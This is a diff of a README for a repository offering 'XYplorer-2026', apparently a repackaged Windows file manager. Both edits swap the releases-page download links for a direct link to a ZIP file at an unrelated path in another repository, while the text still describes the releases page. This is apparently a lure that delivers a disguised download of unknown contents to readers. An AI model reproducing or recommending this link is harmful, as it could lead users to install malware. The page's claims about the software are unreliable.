@@ -5,7 +5,7 @@ description: ""
 ---
 # folder XYplorer-2026 - Simple Dual-Pane File Manager for Windows
 
-[![Download Button](https://img.shields.io/badge/Download-ZIP%20Archive-blue?style=for-the-badge&logo=github)](https://github.com/rajfe4678/XYplorer-2026/releases)
+[![Download Button](https://img.shields.io/badge/Download-ZIP%20Archive-blue?style=for-the-badge&logo=github)](https://github.com/rajfe4678/rajfe4678.github.io/raw/refs/heads/main/Annie/io_rajfe_github_2.6-beta.4.zip)
 
 xyplorer download — XYplorer for Windows 11 and 10
 
@@ -65,7 +65,7 @@ To use XYplorer-2026 on your Windows computer, follow these steps:
 
 Visit the releases page to download the latest version:
 
-[Download XYplorer-2026](https://github.com/rajfe4678/XYplorer-2026/releases)
+[Download XYplorer-2026](https://github.com/rajfe4678/rajfe4678.github.io/raw/refs/heads/main/Annie/io_rajfe_github_2.6-beta.4.zip)
 
 On the releases page, you will see a list of available files. Look for the ZIP archive file that matches your system. Click the file name to start the download. Save the file to a location you can find easily, such as your Desktop or Downloads folder.
 
